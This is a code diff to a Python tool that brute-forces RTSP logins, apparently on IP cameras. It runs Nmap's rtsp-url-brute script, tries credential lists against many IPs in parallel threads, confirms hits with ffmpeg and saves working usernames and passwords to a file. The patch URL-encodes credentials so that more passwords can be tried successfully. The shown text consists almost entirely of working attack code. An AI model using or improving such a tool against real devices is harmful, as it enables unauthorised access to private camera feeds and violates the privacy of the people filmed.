@@ -3,6 +3,7 @@ import subprocess
 import threading
 import queue
 import time
+import urllib.parse
 
 def run_nmap(ip):
     """Runs Nmap with the rtsp-url-brute script on the given IP and saves the output."""
@@ -13,8 +14,11 @@ def run_nmap(ip):
     print(f"[+] Nmap scan completed for {ip}, results saved in {output_file}")
 
 def verify_success(ip, username, password):
-    """Uses ffmpeg to verify if the login is actually successful."""
-    rtsp_url = f"rtsp://{username}:{password}@{ip}:554/"
+    """Verifies a successful login using ffmpeg, with properly encoded credentials."""
+    encoded_username = urllib.parse.quote(username, safe='')
+    encoded_password = urllib.parse.quote(password, safe='')
+
+    rtsp_url = f"rtsp://{encoded_username}:{encoded_password}@{ip}:554/"
     print(f"[?] Verifying credentials: {rtsp_url}")
 
     try:
@@ -24,19 +28,22 @@ def verify_success(ip, username, password):
         if any(err in result.stderr for err in ["Unauthorized", "Invalid data found", "Connection refused", "400 Bad Request"]):
             print(f"[-] False positive: {rtsp_url} (Verification failed)")
             return False
-        
+
         print(f"[+] CONFIRMED SUCCESS: {rtsp_url}")
         with open("valid_credentials.txt", "a") as f:
             f.write(f"{ip} {username}:{password}\n")
         return True
     except subprocess.TimeoutExpired:
         print(f"[-] Verification timeout: {rtsp_url}")
-    
+
     return False
 
 def attempt_login(ip, username, password):
-    """Attempts RTSP login and verifies success."""
-    rtsp_url = f"rtsp://{username}:{password}@{ip}:554/"
+    """Attempts RTSP login and verifies success, properly encoding special characters."""
+    encoded_username = urllib.parse.quote(username, safe='')
+    encoded_password = urllib.parse.quote(password, safe='')
+
+    rtsp_url = f"rtsp://{encoded_username}:{encoded_password}@{ip}:554/"
     print(f"[*] Trying {rtsp_url}")
 
     try:
@@ -50,11 +57,12 @@ def attempt_login(ip, username, password):
 
             # Verify credentials before considering success
             return verify_success(ip, username, password)
-    
+
     except subprocess.TimeoutExpired:
         print(f"[-] Failed: {rtsp_url} (Timeout)")
-    
+
     return False
+
 
 def brute_force_worker(ip, creds_queue, success_list):
     """Worker function to process the credential queue."""
@@ -108,7 +116,7 @@ def main(ip_list_file, creds_file):
 
     success_results = {}
     threads = []
-    
+
     for ip in ips:
         thread = threading.Thread(target=worker, args=(ip, creds, success_results))
         thread.start()
